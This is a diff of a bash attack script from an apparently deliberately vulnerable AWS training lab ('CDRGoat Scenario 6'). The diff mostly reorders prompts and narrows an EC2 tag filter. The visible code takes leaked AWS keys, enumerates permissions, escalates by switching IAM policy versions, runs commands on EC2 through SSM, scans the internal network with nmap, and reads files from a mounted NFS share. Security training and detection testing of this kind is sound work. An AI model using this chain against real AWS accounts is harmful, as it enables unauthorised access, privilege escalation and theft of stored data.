@@ -23,8 +23,8 @@ err()  { printf "[%s] %s[ERR]%s %s\n" "$(date +%H:%M:%S)" "${RED}" "${RESET}" "$
 info() { printf "%s[i]%s   %s\n"  "${BLUE}"   "${RESET}" "$*"; }
 
 printf "%s%s%s\n" "${BOLD}${GREEN}" "  ________  ___  _____          __     " "${RESET}"
-printf "%s%s%s\n" "${BOLD}${GREEN}" " / ___/ _ \/ _ \/ ___/__  ___ _/ /_    " "${RESET}"
-printf "%s%s%s\n" "${BOLD}${GREEN}" "/ /__/ // / , _/ (_ / _ \/ _ \`/ __/   " "${RESET}"
+printf "%s%s%s\n" "${BOLD}${GREEN}" " / ___/ _ \\/ _ \\/ ___/__  ___ _/ /_    " "${RESET}"
+printf "%s%s%s\n" "${BOLD}${GREEN}" "/ /__/ // / , _/ (_ / _ \\/ _ \`/ __/   " "${RESET}"
 printf "%s%s%s\n" "${BOLD}${GREEN}" "\\___/____/_/|_|\\___/\\___/\\_,_/\\__/" "${RESET}"
 printf "\n"
 
@@ -42,34 +42,20 @@ spin_start() {
 }
 spin_stop() { [ -n "${SPIN_PID}" ] && kill "${SPIN_PID}" >/dev/null 2>&1 || true; SPIN_PID=""; printf "\r%*s\r" 120 ""; }
 
-banner() {
-  printf "%s%s%s\n" "${BOLD}${CYAN}" "===           CDRGoat AWS - Scenario 6               ===" "${RESET}"
-  printf "%sThis automated attack script will:%s\n" "${GREEN}" "${RESET}"
-  printf "  • Step 1. Configuring AWS credentials\n"
-  printf "  • Step 2. Permission enumeration for leaked credentials\n"
-  printf "  • Step 3. Inspecting IAM policies for compromised user\n"
-  printf "  • Step 4. Switching between policy versions to gain command execution\n"
-  printf "  • Step 5. Internal network reconnaissance with Nmap\n"
-  printf "  • Step 6. Mounting and exploring the discovered NFS share and exfiltrating sensitive data\n"
-  
+try() {
+  local desc="$1"; shift
+  local rc
+  set +e
+  "$@" >/dev/null 2>&1
+  rc=$?
+  set -e
+  if [ $rc -eq 0 ]; then
+    printf "[%s] %s[OK]%s    %s\n" "$(date +%H:%M:%S)" "$GREEN" "$RESET" "$desc"
+  else
+    printf "[%s] %s[DENY]%s  %s\n" "$(date +%H:%M:%S)" "$RED" "$RESET" "$desc"
+  fi
 }
-banner
 
-#############################################
-# Preflight checks (no changes to your logic)
-#############################################
-step "Preflight checks"
-missing=0
-for c in aws curl jq zip; do
-  if ! command -v "$c" >/dev/null 2>&1; then err "Missing dependency: $c"; missing=1; fi
-done
-[ "$missing" -eq 0 ] && ok "All required tools present" || { err "Install missing tools and re-run"; exit 2; }
-
-read -r -p "Everything is prepared. Press Enter to start (or Ctrl+C to abort)..." _ || true
-#############################################
-# Step 1. Configuring AWS credentials
-#############################################
-printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 1. Configuring AWS credentials to use awscli  ===" "${RESET}"
 is_valid_keys() {
   local key="$1" secret="$2" token="${3:-}" region="${4:-us-east-1}"
   local rc=0 out
@@ -97,6 +83,35 @@ is_valid_keys() {
   return 0
 }
 
+banner() {
+  printf "%s%s%s\n" "${BOLD}${CYAN}" "===           CDRGoat AWS - Scenario 6               ===" "${RESET}"
+  printf "%sLeaked Keys → IAM Policy Version Abuse → SSM Lateral Movement → NFS Data Exfiltration%s\n\n" "${GREEN}" "${RESET}"
+  printf "This automated attack script will:\n"
+  printf "  • Step 1. Configuring AWS credentials\n"
+  printf "  • Step 2. Permission enumeration for leaked credentials\n"
+  printf "  • Step 3. Inspecting IAM policies for compromised user\n"
+  printf "  • Step 4. Switching between policy versions to gain command execution\n"
+  printf "  • Step 5. Internal network reconnaissance with Nmap\n"
+  printf "  • Step 6. Mounting and exploring the discovered NFS share and exfiltrating sensitive data\n"
+}
+banner
+
+#############################################
+# Preflight checks
+#############################################
+step "Preflight checks"
+missing=0
+for c in aws jq; do
+  if ! command -v "$c" >/dev/null 2>&1; then err "Missing dependency: $c"; missing=1; fi
+done
+[ "$missing" -eq 0 ] && ok "All required tools present" || { err "Install missing tools and re-run"; exit 2; }
+
+read -r -p "Everything is prepared. Press Enter to start (or Ctrl+C to abort)..." _ || true
+#############################################
+# Step 1. Configuring AWS credentials
+#############################################
+printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 1. Configuring AWS credentials to use awscli  ===" "${RESET}"
+
 step "Starting point configuration"
 while :; do
   read -r -p "Enter leaked AWS key: " AWSKEY_USER
@@ -108,8 +123,6 @@ while :; do
     err "Not valid keys. STS validation via ${YELLOW}'aws sts get-caller-identity'${RESET} failed"
   fi
 done
-printf "\n"
-read -r -p "Step 1 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
 # Operator explanation
@@ -119,26 +132,13 @@ printf "We configured AWS CLI with leaked IAM user credentials.\n\n"
 printf "This scenario demonstrates IAM policy versioning abuse combined\n"
 printf "with SSM lateral movement and NFS data exfiltration.\n\n"
 
+printf "\n"
+read -r -p "Step 1 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
+
 #############################################
 # Step 2. Permission enumeration for leaked credentials
 #############################################
 printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 2. Permission enumeration for leaked credentials  ===" "${RESET}"
-
-# init colors (portable)
-
-try() {
-  local desc="$1"; shift
-  local rc
-  set +e
-  "$@" >/dev/null 2>&1
-  rc=$?
-  set -e
-  if [ $rc -eq 0 ]; then
-    printf "[%s] %s[OK]%s    %s\n" "$(date +%H:%M:%S)" "$GREEN" "$RESET" "$desc"
-  else
-    printf "[%s] %s[DENY]%s  %s\n" "$(date +%H:%M:%S)" "$RED" "$RESET" "$desc"
-  fi
-}
 
 # Identity/context
 try "STS GetCallerIdentity" aws sts get-caller-identity --profile "$PROFILE"
@@ -158,10 +158,6 @@ try "RDS DescribeDBs"       aws rds describe-db-instances --max-records 20 --pro
 try "Logs DescribeLogGroups" aws logs describe-log-groups --limit 5 --profile "$PROFILE"
 try "CloudTrail DescribeTrails" aws cloudtrail describe-trails --profile "$PROFILE"
 
-printf "\nOK, it seems our permissions are quite limited. Let's try to get some more info about our user...\n"
-printf "\n"
-read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
-
 #############################################
 # Operator explanation
 #############################################
@@ -170,6 +166,9 @@ printf "Most services returned [DENY] - appears to be restricted.\n\n"
 printf "However, examining IAM policy details may reveal:\n"
 printf "  • Policy versions with different permissions\n"
 printf "  • Escalation paths through IAM itself\n\n"
+
+printf "\n"
+read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
 # Step 3. Inspecting IAM policies for compromised user
@@ -218,14 +217,13 @@ if [ -n "$ATTACHED_POLICY_ARNs" ]; then
     default=$(aws iam get-policy --policy-arn "$arn" --profile "$PROFILE" --query 'Policy.DefaultVersionId' --output text)
     info "Default version: ${YELLOW}${default}${RESET}"
 
-    # Optional: download and show default version
+    # Download and show default version
     aws iam get-policy-version \
       --policy-arn "$arn" \
       --version-id "$default" \
       --profile "$PROFILE" \
       --output json | jq '.PolicyVersion.Document'
     printf "\n"
-    read -r -p "Looks interesting. We have more than one version of attached policy and have permissions to switch. Lets check configuration of other versions. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
     # Loop over versions, skipping the default
     for ver in $versions; do
@@ -243,9 +241,6 @@ if [ -n "$ATTACHED_POLICY_ARNs" ]; then
 else
   info "(none)"
 fi
-printf "\nBased on what we see above we may switch to version 2, get the list of EC2, and using version 3 executing commands on them. Lets try...\n"
-printf "\n"
-read -r -p "Step 3 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
 # Operator explanation
@@ -257,6 +252,9 @@ printf "we can switch to a more privileged version:\n"
 printf "  • v1 (current): Limited permissions\n"
 printf "  • v2: Includes EC2 DescribeInstances\n"
 printf "  • v3: Includes SSM SendCommand\n\n"
+
+printf "\n"
+read -r -p "Step 3 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
 # Step 4. Switching between policy versions to gain command execution
@@ -283,10 +281,10 @@ ok "Now using v2"
 
 sleep 10
 
-# 2) Enumerate EC2 instances with name tag starting StreamGoat
+# 2) Enumerate EC2 instances with name tag starting StreamGoat-aws6
 step "Enumerating EC2 instances"
 EC2_IDS=$(aws ec2 describe-instances \
-  --filters "Name=tag:Name,Values=StreamGoat-*" "Name=instance-state-name,Values=running" \
+  --filters "Name=tag:Name,Values=StreamGoat-aws6-*" "Name=instance-state-name,Values=running" \
   --query 'Reservations[].Instances[].InstanceId' \
   --output text \
   --profile "$PROFILE" | tr '\t' ' ')
@@ -294,7 +292,7 @@ EC2_IDS=$(aws ec2 describe-instances \
 if [ -n "$EC2_IDS" ]; then
   ok "Found instance(s): $EC2_IDS"
 else
-  err "No StreamGoat-* EC2 instances found"
+  err "No StreamGoat-aws6-* EC2 instances found"
 fi
 
 # Save one for attack
@@ -310,7 +308,7 @@ ok "Now using v3"
 
 sleep 10
 
-# 4) Try executing command via SSM (should fail under v3, but attacker tests)
+# 4) Try executing command via SSM
 step "Attempting SSM command execution on $TARGET_EC2"
 CMD_ID=$(aws ssm send-command \
   --targets "Key=instanceIds,Values=$TARGET_EC2" \
@@ -332,10 +330,6 @@ else
   err "SSM command execution failed"
 fi
 
-printf "\nGood result! No we can pivot into the network and try to collect information about local network.\n"
-printf "\n"
-read -r -p "Step 4 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
-
 #############################################
 # Operator explanation
 #############################################
@@ -345,6 +339,9 @@ printf "  1. Switched to v2 → Gained EC2 DescribeInstances\n"
 printf "  2. Switched to v3 → Gained SSM SendCommand\n\n"
 printf "SSM allows command execution without SSH access,\n"
 printf "bypassing network security controls.\n\n"
+
+printf "\n"
+read -r -p "Step 4 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
 # Step 5. Internal network reconnaissance with Nmap
@@ -428,8 +425,6 @@ else
   err "No host found with port 2049 open. Exiting."
   exit 1
 fi
-printf "\n"
-read -r -p "Step 5 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
 # Operator explanation
@@ -439,6 +434,9 @@ printf "We performed internal network reconnaissance via SSM.\n\n"
 printf "Installed nmap and scanned the subnet for interesting services.\n"
 printf "Found host with port 2049 open (${MAGENTA}NFS${RESET})!\n\n"
 printf "NFS/EFS often contains sensitive data with weak access controls.\n\n"
+
+printf "\n"
+read -r -p "Step 5 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
 # Step 6. Mount and explore discovered NFS share
@@ -499,7 +497,7 @@ for file in $FILENAMES; do
     --query 'Command.CommandId' \
     --output text \
     --profile "$PROFILE")
-  
+
   sleep 2
 
   FILE_CONTENT=$(aws ssm list-command-invocations \
@@ -511,8 +509,6 @@ for file in $FILENAMES; do
 
   echo -e "\n${YELLOW}[FILE: $file]${RESET}\n$FILE_CONTENT\n"
 done
-
-printf "We got access to sensitive data stored in internal EFS.\n"
 
 ################################################################################
 # Final Summary
